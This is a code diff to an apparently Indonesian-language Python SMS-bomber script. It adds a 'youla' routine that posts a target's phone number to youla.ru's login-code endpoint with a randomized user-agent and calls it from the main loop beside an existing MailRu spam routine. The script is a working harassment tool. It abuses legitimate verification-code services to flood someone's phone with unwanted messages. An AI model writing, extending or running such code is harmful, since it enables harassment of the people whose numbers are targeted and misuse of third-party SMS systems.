@@ -66,6 +66,8 @@ class main:
       loding()
       spam.mailru(nom)
       loding()
+      spam.youla(nom)
+      loding()
       print (f"{ken}[{kun}•{ken}] {kan}Proses selesai")
   except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
   except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
@@ -511,6 +513,15 @@ class spam:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}MailRu{kun} Gagal")
      else:
       print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}MailRu{kan} OK")
+ def youla(nom):
+     r = ru.Session()
+     hd = {'user-agent':ua.random}
+     dat = {'phone':'62'+nom}
+     yu = r.post("https://youla.ru/web-api/auth/request_code",headers=hd,data=dat)
+     if 'error' in yu.text:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Youla{kun} Gagal")
+     else:
+      print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({kun}SMS{kan}) {ken}Youla{kan} OK")
 try:
  os.system("clear")
  bnr()
